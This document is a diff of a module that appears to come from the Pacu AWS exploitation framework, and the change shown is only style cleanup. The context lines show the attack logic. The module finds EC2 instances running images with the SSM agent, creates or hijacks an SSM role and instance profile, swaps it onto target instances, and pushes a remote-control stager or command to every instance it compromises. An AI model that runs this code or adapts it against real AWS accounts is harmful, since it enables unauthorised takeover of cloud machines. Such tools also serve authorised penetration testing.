@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import argparse
+from botocore.exceptions import ClientError
 import os
 import re
 import time
-from botocore.exceptions import ClientError
+
 
 module_info = {
     # Name of the module (should be the same as the filename)
@@ -67,7 +68,8 @@ def main(args, pacu_main):
         print('Invalid arguments received. Expecting one or zero of --all-instances and --target-instances, received both.\n')
         return
 
-    # If no command was passed in and PacuProxy is listening, set the command to be executed to a PacuProxy stager
+    # If no command was passed in and PacuProxy is listening, set the command
+    # to be executed to a PacuProxy stager
     if args.command is None and proxy_settings.listening is True:
         pp_ps_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'ps')
         pp_sh_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'sh')
@@ -76,7 +78,7 @@ def main(args, pacu_main):
         return
 
     if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
-        print('Pre-req module not run successfully. Exiting...')
+        print('Pre-req module not run successfully. Exiting...\n')
         return
     instances = session.EC2['Instances']
 
@@ -91,7 +93,7 @@ def main(args, pacu_main):
         ssm_instance_profile_name = ''
 
     if args.all_instances is False and args.target_instances is None:
-        # DryRun describe_images (don't need to DryRun this if args.all_instances is True)
+        # DryRun describe_images (unneeded if args.all_instances is True)
         try:
             client = pacu_main.get_boto3_client('ec2', regions[0])
             client.describe_images(
@@ -112,7 +114,7 @@ def main(args, pacu_main):
         vuln_images = []
         for region in regions:
             image_ids = []
-            print('Starting region {}...\n'.format(region))
+            print(f'Starting region {region}...')
             client = pacu_main.get_boto3_client('ec2', region)
 
             for instance in instances:
@@ -127,18 +129,23 @@ def main(args, pacu_main):
                     ImageIds=list(set(image_ids))
                 )['Images']
 
-                # Iterate images and determine if they are possibly one of the operating systems with SSM agent installed by default
+                # Iterate images and determine if they are possibly one of the
+                # operating systems with SSM agent installed by default
                 count = 0
                 for image in images:
-                    os_details = '{} {} {}'.format(image['Description'], image['ImageLocation'], image['Name'])
+                    os_details = '{} {} {}'.format(
+                        image['Description'],
+                        image['ImageLocation'],
+                        image['Name']
+                    )
                     for vuln_os in os_with_default_ssm_agent:
                         result = re.match(r'{}'.format(vuln_os), os_details)
                         if result is not None:
                             count += 1
                             vuln_images.append(image['ImageId'])
                             break
-                print('  {} vulnerable images found.\n'.format(count))
-        print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
+                print(f'  {count} vulnerable images found.\n')
+        print(f'Total vulnerable images found: {len(vuln_images)}\n')
 
     if ssm_instance_profile_name == '':
         # Begin Systems Manager role finder/creator
@@ -167,7 +174,8 @@ def main(args, pacu_main):
                                     RoleName=role['RoleName'],
                                     PathPrefix='/service-role/'
                                 )['AttachedPolicies']
-                                # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
+                                # It is an EC2 role, now figure out if it is an SSM EC2
+                                # role by checking for the SSM policy being attached
                                 for policy in attached_policies:
                                     if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                         ssm_role_name = role['RoleName']
@@ -183,7 +191,8 @@ def main(args, pacu_main):
                                 attached_policies = client.list_attached_role_policies(
                                     RoleName=role['RoleName']
                                 )['AttachedPolicies']
-                                # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
+                                # It is an EC2 role, now figure out if it is an SSM EC2
+                                # role by checking for the SSM policy being attached
                                 for policy in attached_policies:
                                     if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                         ssm_role_name = role['RoleName']
@@ -210,12 +219,12 @@ def main(args, pacu_main):
                     RoleName=ssm_role_name,
                     PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
                 )
-                print('  Successfully created the required role: {}\n'.format(create_response['Arn']))
+                print(f"  Successfully created the required role: {create_response['Arn']}\n")
             except Exception as error:
-                print('  Unable to create the required role: {}\n'.format(str(error)))
+                print(f'  Unable to create the required role: {str(error)}\n')
                 return
         else:
-            print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...\n'.format(ssm_role_name))
+            print(f'Found valid SystemsManager service role: {ssm_role_name}. Checking if it is associated with an instance profile...\n')
 
             # Find instance profile belonging to that role
             response = client.list_instance_profiles_for_role(
@@ -226,7 +235,7 @@ def main(args, pacu_main):
             if len(response['InstanceProfiles']) > 0:
                 ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
                 ssm_instance_profile_arn = response['InstanceProfiles'][0]['Arn']
-                print('Found valid instance profile: {}.\n'.format(ssm_instance_profile_name))
+                print(f'Found valid instance profile: {ssm_instance_profile_name}.\n')
             # Else, leave ssm_instance_profile_name == ''
 
         # If no instance profile yet, create one with the role we have
@@ -247,7 +256,7 @@ def main(args, pacu_main):
                     RoleName=ssm_role_name
                 )
             except Exception as error:
-                print('  Unable to create an instance profile: {}\n'.format(str(error)))
+                print(f'  Unable to create an instance profile: {str(error)}\n')
                 return
 
     # If there are target instances passed in as arguments, fix instances and regions
@@ -295,7 +304,7 @@ def main(args, pacu_main):
                             if args.replace is True and replace is True:
                                 instances_to_replace.append(instance['InstanceId'])
                             else:
-                                print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
+                                print(f"  Instance ID {instance['InstanceId']} already has an instance profile attached to it, skipping...")
                                 pass
                         else:
                             # There is no instance profile attached yet, do it now
@@ -307,7 +316,7 @@ def main(args, pacu_main):
                                 }
                             )
                             targeted_instances.append(instance['InstanceId'])
-                            print('  Instance profile attached to instance ID {}.'.format(instance['InstanceId']))
+                            print(f"  Instance profile attached to instance ID {instance['InstanceId']}.")
         if len(instances_to_replace) > 0 and replace is True:
             # There are instances that need their role replaced, so discover association IDs to make that possible
             all_associations = []
@@ -346,9 +355,9 @@ def main(args, pacu_main):
                         }
                     )
                     targeted_instances.append(instance_id)
-                    print('  Instance profile replaced for instance ID {}.'.format(instance_id))
+                    print(f'  Instance profile replaced for instance ID {instance_id}.')
                 except Exception as error:
-                    print('  Failed to run replace_iam_instance_profile_association on instance ID {}: {}\n'.format(instance_id, str(error)))
+                    print(f'  Failed to run replace_iam_instance_profile_association on instance ID {instance_id}: {str(error)}\n')
                     replace = input('Do you want to keep trying to replace instance profiles, or skip the rest based on the error shown? (y/n) ')
                     if replace == 'y':
                         replace = True
@@ -390,19 +399,19 @@ def main(args, pacu_main):
                     if args.target_os.lower() == 'all' or instance[1].lower() == args.target_os.lower():
                         # Is this instance eligible for an attack, but was not targeted?
                         if instance[0] not in targeted_instances:
-                            action = input('  Instance ID {} (Platform: {}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to try and attack this instance (a) or ignore it (i)? (a/i) '.format(instance[0], instance[1]))
+                            action = input(f'  Instance ID {instance[0]} (Platform: {instance[1]}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to try and attack this instance (a) or ignore it (i)? (a/i) ')
                             if action == 'i':
                                 ignored_instances.append(instance[0])
                                 continue
                             else:
-                                print('  Adding instance ID {} to list of targets.\n'.format(instance[0]))
+                                print(f'  Adding instance ID {instance[0]} to list of targets.\n')
                                 targeted_instances.append(instance[0])
                         if instance[1].lower() == 'windows':
                             windows_instances_to_attack.append(instance[0])
                         elif instance[1].lower() == 'linux':
                             linux_instances_to_attack.append(instance[0])
                         else:
-                            print('  Unknown operating system for instance ID {}: {}. Not attacking it...\n'.format(instance[0], instance[1]))
+                            print(f'  Unknown operating system for instance ID {instance[0]}: {instance[1]}. Not attacking it...\n')
 
             # Collectively attack all new instances that showed up in the last check for this region
 
@@ -446,7 +455,7 @@ def main(args, pacu_main):
                 this_check_attacked_instances.extend(linux_instances_to_attack)
                 attacked_instances.extend(linux_instances_to_attack)
 
-        print('  {} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
+        print(f'  {len(this_check_attacked_instances)} new instances attacked in the latest check: {this_check_attacked_instances}\n')
 
         if attacked_instances == targeted_instances:
             # All targeted instances have been attacked, stop polling every 30 seconds
@@ -460,11 +469,11 @@ def main(args, pacu_main):
     if i == 20:
         # We are here because it has been 10 minutes
         print('It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
-        print('Successfully attacked the following instances: {}\n'.format(attacked_instances))
+        print(f'Successfully attacked the following instances: {attacked_instances}\n')
     else:
         # We are here because all targeted instances have been attacked
         print('All targeted instances showed up and were attacked.\n')
-        print('Successfully attacked the following instances: {}\n'.format(attacked_instances))
+        print(f'Successfully attacked the following instances: {attacked_instances}\n')
 
-    print('{} completed.'.format(os.path.basename(__file__)))
+    print(f'{os.path.basename(__file__)} completed.')
     return
